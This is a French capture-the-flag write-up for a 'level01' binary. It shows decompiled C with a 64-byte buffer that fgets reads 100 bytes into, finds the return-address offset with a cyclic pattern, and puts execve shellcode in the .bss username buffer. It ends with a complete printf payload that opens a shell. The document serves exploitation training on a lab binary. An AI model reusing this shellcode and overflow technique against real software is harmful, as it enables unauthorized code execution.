# level01 : buffer overflow + shellcode en .bss

```c
char a_user_name;

int verify_user_name(void)
{
    puts("verifying username....\n");
    return strncmp(&a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *pass)
{
    return strncmp(pass, "admin", 5);
}

int main(void)
{
    char local_54[64];
    int  local_14 = 0;

    memset(local_54, 0, 64);
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(&a_user_name, 0x100, stdin);

    local_14 = verify_user_name();
    if (local_14 == 0) {
        puts("Enter Password: ");
        fgets(local_54, 100, stdin);
        local_14 = verify_user_pass(local_54);

        if ((local_14 == 0) || (local_14 != 0))
            puts("nope, incorrect password...\n");
        else
            return 0;
        return 1;
    }
    else {
        puts("nope, incorrect username...\n");
        return 1;
    }
}
```

username en clair :

    dat_wil

pattern pour exploit le password buffer qui fait 64 octets, alors que fgets check 100 :

    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
    [#0] Id 1, Name: "level01", stopped 0x61616175 in ?? (), reason: SIGSEGV
    https://www.rapidtables.com/convert/number/hex-to-ascii.html
    61616175 = "aaau" in ASCII = "uaaa" in little endian = offset 80


username est une global donc une adresse .bss (zone variable statique/globale) donc adresse fixe, facilement retrouvable:

    p &a_user_name
    $1 = (<data variable, no debug info> *) 0x804a040 <a_user_name>
    804a040

En little endian: 

    \x40\xa0\x04\x08

Préparation du payload:


    execve("/bin//sh", NULL, NULL); == \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

    804a040 (username) + dat_wil  = 804a040 + 7 = 804a047

    username = dat_wil + execve("/bin//sh", NULL, NULL)

    password = offset + adresse de dat_wil qui remplace le return


Payload:

    (
      printf 'dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80\n'
      printf 'A%.0s' {1..80}
      printf '\x47\xa0\x04\x08\n'
      cat
    ) | ./level01
